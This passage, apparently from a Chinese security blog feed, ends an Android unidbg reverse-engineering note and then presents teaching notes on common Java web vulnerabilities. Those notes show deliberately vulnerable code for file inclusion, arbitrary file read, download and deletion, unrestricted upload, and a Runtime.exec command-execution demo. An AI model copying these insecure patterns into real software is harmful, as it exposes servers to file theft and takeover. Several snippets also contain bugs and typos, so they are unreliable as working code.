class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dta&quot;</span>;<br>        DvmObject&lt;?&gt; result = object.callJniMethodObject(emulator,<span class="hljs-string">&quot;md5(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, data);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (String) result.getValue();<br>        System.out.println(<span class="hljs-string">&quot;(symbol)md5 ====&gt; result: &quot;</span> + value);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call_address</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">/* 地址调用（虽然复杂，但是最好用）</span><br><span class="hljs-comment">        这部分基本上固定写法，只需要改地址偏移和参数类型就行</span><br><span class="hljs-comment">        在so文件里面方法的一般是Java_com_dta_lesson2_md5(JNIEnv *env, jobject thiz, jstring str);</span><br><span class="hljs-comment">        所以下面要创建对应的参数, 基本为固定写法</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">Pointer</span> <span class="hljs-variable">jniEnv</span> <span class="hljs-operator">=</span> vm.getJNIEnv();<br>        DvmObject&lt;?&gt; obj = ProxyDvmObject.createObject(vm, <span class="hljs-built_in">this</span>);<br>        <span class="hljs-comment">// 如果要传入vm.addLocalObject，String只能这么写</span><br>        <span class="hljs-type">StringObject</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringObject</span>(vm, <span class="hljs-string">&quot;dta&quot;</span>);<br><br>        List&lt;Object&gt; args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        args.add(jniEnv);<br>        <span class="hljs-comment">// 除了指针类型和Number类型都需要添加到vm(vm.addLocalObject)才能够在vm中操作该对象</span><br>        args.add(vm.addLocalObject(obj));<br>        args.add(vm.addLocalObject(data));<br><br>        <span class="hljs-comment">// 0x8E81是地址偏移（加过1的）</span><br>        <span class="hljs-type">Number</span> <span class="hljs-variable">numbers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">module</span>.callFunction(emulator, <span class="hljs-number">0x8E81</span>, args.toArray());<br>        DvmObject&lt;?&gt; object = vm.getObject(numbers.intValue());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (String) object.getValue();<br>        System.out.println(<span class="hljs-string">&quot;(addr)md5 ====&gt; result: &quot;</span> + value);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">MainActivity</span> <span class="hljs-variable">mainActivity</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MainActivity</span>();<br>        mainActivity.md5();<br><br>        mainActivity.call_address();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="image-20240724202817696.png" alt="image-20240724202817696"></p><p>native层还得看frida。。。。。。。。。</p><p>ida调试so文件（re11113）</p><p><img src="image-20240725034556041.png" alt="image-20240725034556041"></p><p><img src="image-20240725034618178.png" alt="image-20240725034618178"></p><p>gdbserver无法发送SIGINT信号给指定进程组的进程</p><p>估计要jeb调试</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>java常规漏洞</title>
    <link href="/2025/03/22/java%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/03/22/java%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h5 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h5><p>使用request.getParameter获取get传参</p><p>使用jsp:include来进行动态文件包含</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>测试页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br> &lt;% String name = request.getParameter(&quot;name&quot;);%&gt;<br> <span class="hljs-tag">&lt;<span class="hljs-name">jsp:include</span> <span class="hljs-attr">page</span>=<span class="hljs-string">&quot;&lt;%=name%&gt;&quot;</span> /&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="文件读取漏洞"><a href="#文件读取漏洞" class="headerlink" title="文件读取漏洞"></a>文件读取漏洞</h5><p>任意文件读取漏洞可以读取配置信息和系统重要文件，导致原因是因为Java文件读取操作，或者因文件包含导致。</p><p>函数：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">InputStream</span><br><span class="hljs-attribute">FileReader</span><br></code></pre></td></tr></table></figure><p>InputStream代码：输入流</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/readServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">readServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;  <span class="hljs-comment">//表示此方法不处理异常，而交给方法调用处进行处理</span><br>    <span class="hljs-built_in">this</span>.doGet(request, response);<br>    &#125;    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;filename&quot;</span>); <span class="hljs-comment">//获取参数</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filename);<br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);  <span class="hljs-comment">//FileInputStream流被称为文件字节输入流，意思指对文件数据以字节的形式进行读取操作如读取图片视频等</span><br>        <span class="hljs-type">int</span> len;<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">while</span>(-<span class="hljs-number">1</span> != (len = inputStream.read())) &#123;<br>            outputStream.write(bytes,<span class="hljs-number">0</span>,len);<br>        &#125;<br>&#125;&#125;<br><br></code></pre></td></tr></table></figure><p>字节输入流InputStream</p><p>构造器 </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">FileInputStream</span><span class="hljs-params">(File file)</span></span><br>          通过打开一个到实际文件的连接来创建一个 FileInputStream，该文件通过文件系统中的 File 对象 file 指定。<br><br><span class="hljs-function"><span class="hljs-title">FileInputStream</span><span class="hljs-params">(FileDescriptor fdObj)</span></span><br>          通过使用文件描述符 fdObj 创建一个 FileInputStream，该文件描述符表示到文件系统中某个实际文件的现有连接。<br><br><span class="hljs-function"><span class="hljs-title">FileInputStream</span><span class="hljs-params">(String name)</span></span><br>          通过打开一个到实际文件的连接来创建一个 FileInputStream，该文件通过文件系统中的路径名 name 指定。<br><br></code></pre></td></tr></table></figure><p>读取方法</p><table><thead><tr><th align="center">INT</th><th>read()    从此输入流中读取一个数据字节。</th></tr></thead><tbody><tr><td align="center">INT</td><td>read(byte[] b)  从此输入流中将最多 b.length 个字节的数据读入一个 byte 数组中。</td></tr><tr><td align="center">INT</td><td>read(byte[] b, int off, int len)     从此输入流中将最多 len 个字节的数据读入一个 byte 数组中。</td></tr></tbody></table><p>FileReader代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/downServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">readServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-built_in">this</span>.doGet(request, response);<br>    &#125;    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;filename&quot;</span>); <br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileContent</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-type">FileReader</span> <span class="hljs-variable">fileReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(filename);   <span class="hljs-comment">//public FileReader(String name)—根据文件名称创建一个可读取的输入流对象，在给定从中读取数据的文件名</span><br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(fileReader); <span class="hljs-comment">//从字符输入流中读取文本，缓冲字符，以便有效地读取字符，数组和行。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">null</span> != (line = bufferedReader.readLine())) &#123;<br>            fileContent += (line + <span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br>        &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="文件下载漏洞"><a href="#文件下载漏洞" class="headerlink" title="文件下载漏洞"></a>文件下载漏洞</h5><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs coq">Servlet程序实现下载过程：<br><br><span class="hljs-number">1</span>、通过<span class="hljs-keyword">File</span>对象进行文件的封装<br><br><span class="hljs-number">2</span>、通过setContentTpye方法设置Content-<span class="hljs-keyword">Type</span>字段的值<br><br><span class="hljs-number">3</span>、浏览器通过附件的形式来获取到用户上传的文件；<br><br><span class="hljs-number">4</span>、读取下载文件<br></code></pre></td></tr></table></figure><table><thead><tr><th align="center">业务逻辑关键字</th><th align="center">相关操作类</th></tr></thead><tbody><tr><td align="center">download</td><td align="center">InputStream</td></tr><tr><td align="center">filename</td><td align="center">File</td></tr><tr><td align="center">filePath</td><td align="center">OutputStreaam</td></tr><tr><td align="center">write</td><td align="center">BufferedInputStream</td></tr><tr><td align="center">getFile</td><td align="center">FileInputStream</td></tr><tr><td align="center">getPath</td><td align="center">FileUtil</td></tr><tr><td align="center">getWriter</td><td align="center">IOUtil</td></tr></tbody></table><p>uploadfile，upload</p><p>通过request.getParameter获取到get传递的参数：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sas">String <span class="hljs-keyword">filename</span> = request.getParameter(<span class="hljs-string">&quot;filename&quot;</span>);     <br><span class="hljs-keyword">File</span> <span class="hljs-keyword">file</span> = new <span class="hljs-keyword">File</span>(path+<span class="hljs-keyword">filename</span>);    <br></code></pre></td></tr></table></figure><p>设置头信息，利用附件形式打开文件，然后读取要下载的文件返回给浏览器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">response.setContentType(<span class="hljs-string">&quot;application/x-msdownload&quot;</span>);       <br><span class="hljs-comment">//设置头信息(以附件形式打开)       </span><br>response.setHeader(“Content- Disposition<span class="hljs-string">&quot;, &quot;</span>attachment;filename=<span class="hljs-string">&quot;&quot;</span>+filename+<span class="hljs-string">&quot;&quot;&quot;);</span><br><span class="hljs-string">//读取要下载的文件       </span><br><span class="hljs-string">InputStream inputStream = new FileInputStream(file);       </span><br><span class="hljs-string">ServletOutputStream outputStream = response.getOutputStream();   </span><br></code></pre></td></tr></table></figure><h5 id="文件删除漏洞"><a href="#文件删除漏洞" class="headerlink" title="文件删除漏洞"></a>文件删除漏洞</h5><p>后端提供删除文件操作，并且删除文件可以由用户控制，会产生任意文件删除漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/downServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">readServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-built_in">this</span>.doGet(request, response);<br>    &#125;    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;filename&quot;</span>);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filename);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>        <span class="hljs-keyword">if</span>(file != <span class="hljs-literal">null</span> &amp;&amp; file.exists() &amp;&amp; file.delete()) &#123;<br>            writer.println(<span class="hljs-string">&quot;删除成功&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            writer.println(<span class="hljs-string">&quot;删除失败&quot;</span>);<br>        &#125;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">FileTypeUtil.getType ##幻数<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.Controller;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">import</span> org.springframework.web.multipart.MultipartFile;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">upLoad</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">upLoad</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getRandomString</span><span class="hljs-params">(<span class="hljs-type">int</span> length)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;zxcvbnmlkjhgfdsaqwertyuiopQWERTYUIOPASDFGHJKLZXCVBNM1234567890&quot;</span>;<br>        <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> random.nextInt(<span class="hljs-number">62</span>);  <span class="hljs-comment">//nextInt：空格不作为两个字符串的间隔，而是看作字符串的一部分</span><br>            sb.append(str.charAt(number));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">logUpload</span><span class="hljs-params">(MultipartFile file)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>);  <span class="hljs-comment">//System.getProperty：获取系统变量</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">generatedString</span> <span class="hljs-operator">=</span> getRandomString(<span class="hljs-number">10</span>);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">fileUpload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filePath, generatedString + <span class="hljs-string">&quot;.png&quot;</span>);  <span class="hljs-comment">//File：用于文件和目录的创建、查找和删除等操作</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            file.transferTo(fileUpload);  <span class="hljs-comment">//内存中图片写入磁盘</span><br>            <span class="hljs-keyword">return</span> generatedString + <span class="hljs-string">&quot;.png&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var6) &#123;   <span class="hljs-comment">//IOException：异常的处理方式</span><br>            System.out.println(var6);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">logUpload2</span><span class="hljs-params">(MultipartFile file)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">fileUpload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filePath, file.getOriginalFilename());  <span class="hljs-comment">//file.getOriginalFilename():得到上传时的文件名</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            file.transferTo(fileUpload);<br>            <span class="hljs-keyword">return</span> fileUpload.getPath();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var5) &#123;<br>            System.out.println(var5);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出转义</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">CodecORACLE_CODEC <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> OracleCodec();<br>Stringquery <span class="hljs-operator">=</span> &quot;SELECT uer_id FROM user_data WHERE user_name = &#x27;&quot;<br><span class="hljs-operator">+</span>ESAPI.encoder().encodeForSQL( ORACLE_CODEC,req.getParamaeter(&quot;userID&quot;))<br><span class="hljs-operator">+</span> &quot;&#x27;and user_password = &#x27;&quot;<br><span class="hljs-operator">+</span> ESAPI.encoder().encoderForSQL( ORACLE_CODEC,rea.getParameter(&quot;pwd&quot;)) <span class="hljs-operator">+</span>&quot;&#x27;&quot;<br></code></pre></td></tr></table></figure><p>1. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> com.Controller;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.EnableAutoConfiguration;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><span class="hljs-keyword">import</span> org.springframework.web.multipart.MultipartFile;<br><br><span class="hljs-meta">@EnableAutoConfiguration</span><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorldController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HelloWorldController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/in&quot;&#125;)</span>  <span class="hljs-comment">//`@RequestMapping(&#123;&quot;/in&quot;&#125;)`：这是一个Spring MVC注解，用于将HTTP请求映射到方法。在这个例子中，`/in`路径的HTTP请求将由下面的`logUpload`方法处理。路由</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">logUpload</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">upLoad</span>()).logUpload(file);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/in2&quot;&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">logUpload2</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">upLoad</span>()).logUpload2(file);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>可让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><p><strong>java.lang.Runtime</strong></p><p>反序列化漏洞通常会利用Runtime类来实现RCE命令执行从而控制目标服务器，但有时候我们会发现在某些情况下，Runtime类并不能执行一些较为复杂的命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuntimeTest</span> &#123;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        runtime.exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;notepad&quot;</span>&#125;);<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        runtime.exec(<span class="hljs-string">&quot;cmd /c calc &amp; notepad&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test3</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> 